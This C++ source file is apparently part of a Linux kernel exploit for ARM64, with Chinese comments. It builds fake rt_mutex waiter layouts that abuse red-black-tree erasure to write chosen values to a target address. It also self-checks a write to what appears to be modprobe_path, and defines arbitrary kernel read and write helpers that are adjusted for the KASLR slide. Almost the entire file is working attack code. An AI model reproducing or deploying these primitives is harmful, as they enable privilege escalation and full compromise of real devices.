#include "tools.h"
#include <chrono>
#include <cstring>
#include <thread>
#include <unistd.h>
#include <ctime>
#include <fcntl.h>
#include <sys/stat.h>
#include <fstream>
#include "const.h"
#include "prim/prim.h"
using std::cout, std::dec, std::endl, std::hex;
unsigned long rdcntfrq() {
    unsigned long v;
    asm volatile("mrs %0, cntfrq_el0" : "=r"(v));
    return v;
}

unsigned long rdcnt() {
    unsigned long v;
    asm volatile("mrs %0, cntvct_el0" : "=r"(v));
    return v;
}

void pstr(const char *s) {
    write(1, s, strlen(s));
}

long my_tid() {
    return syscall(SYS_gettid);
}

void mysleep(int ms) {
    std::this_thread::sleep_for(std::chrono::milliseconds(ms));
}

void ptime() {
    struct stat sb{};
    if (stat("/proc/self/exe", &sb) != 0) return;
    tm t{};
    localtime_r(&sb.st_mtime, &t);
    printf("文件时间(GMT+8)：%02d:%02d\n", t.tm_hour+8, t.tm_min);
}

void selfCheck() {
    Print print("SelfCheck");
    std::vector<unsigned long> data;
    Prim::getInstance().read_link(LINK_MODPROBE_DATA, data, 3, 0);
    //此时VICTIM已在Prim方法中赋值
    unsigned long jsx = VICTIM - 8 | 1; //寄生写
    if (data[0] == jsx) {
        print("0号布局自校验通过");
    }
    else {
        print("0号布局自校验不通过：");
        std::cout << "期望=" << std::hex << jsx  << '\n';
        std::cout << "实际="             << data[0] << '\n' << std::dec;
    }
    Prim::getInstance().read_link(LINK_MODPROBE_DATA, data, 3, 1);
    jsx = VICTIM;
    if (data[1] == jsx) {
        print("1号布局自校验通过");
    }
    else {
        print("1号布局自校验不通过：");
        std::cout << "期望=" << std::hex << jsx  << '\n';
        std::cout << "实际="             << data[1] << '\n' << std::dec;
    }
    cout << hex;
    print("读取结果=",data[0]," ",data[1]);
    cout << dec;
}

void update_waiter_layout() {
    // *VICTIM = PAYLOAD, *PAYLOAD = (VICTIM - 8) | 1
    waiter_layout[0] = {
        (VICTIM - 8) | 1,        // tree_entry.__rb_parent_color
        PAYLOAD,   // rb_right
        0,         // rb_left = 0 ⇒ __rb_erase_augmented 的「Case 1: !tmp」分支
        0, 0, 0,   // pi_tree_entry（未用）
        INIT_TASK, // task（init_task，state=0 ⇒ wake_up_process 早退）
        LOCK,      // lock → 伪 rt_mutex
        0,         // major_prio / major_only
        130,       // prio
        0          // deadline
    };
    // *VICTIM = PAYLOAD, *(PAYLOAD + 8) = VICTIM
    waiter_layout[1] = {
        PAYLOAD,
        0,
        VICTIM,
        0, 0, 0,
        INIT_TASK,
        LOCK,
        0, 130, 0
    };
    // *VICTIM = 0
    waiter_layout[2] = {
        VICTIM - 8,
        0,
        0,
        0, 0, 0,
        INIT_TASK,
        LOCK,
        0, 130, 0
    };
}

std::string ultohex(unsigned long v, bool showbase) {
    std::ostringstream os;
    if (showbase) os << "0x";
    os << std::hex << v << dec;
    return os.str();
}

unsigned long read_1_rt(unsigned long addr) {
    std::vector<unsigned long> data;
    Prim::getInstance().read_link(addr - kaslr_slide, data, 1, 1);
    return data[0];
}

void write_1_rt(unsigned long addr, unsigned long val) {
    Prim::getInstance().write_link(addr - kaslr_slide, val - kaslr_slide, 1);
}